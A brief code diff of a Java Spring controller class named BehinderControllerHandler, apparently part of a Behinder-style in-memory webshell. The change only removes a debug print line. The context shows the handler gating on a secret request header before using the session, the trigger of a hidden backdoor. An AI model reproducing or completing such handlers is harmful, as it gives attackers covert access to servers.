@@ -35,7 +35,6 @@ public class BehinderControllerHandler extends ClassLoader implements Controller
     }
 
     public ModelAndView handleRequest(HttpServletRequest request, HttpServletResponse response) throws Exception {
-        System.out.println(response.getClass().getName());
         if (request.getHeader(headerName) != null && request.getHeader(headerName).contains(headerValue)) {
             try {
                 HttpSession session = request.getSession();
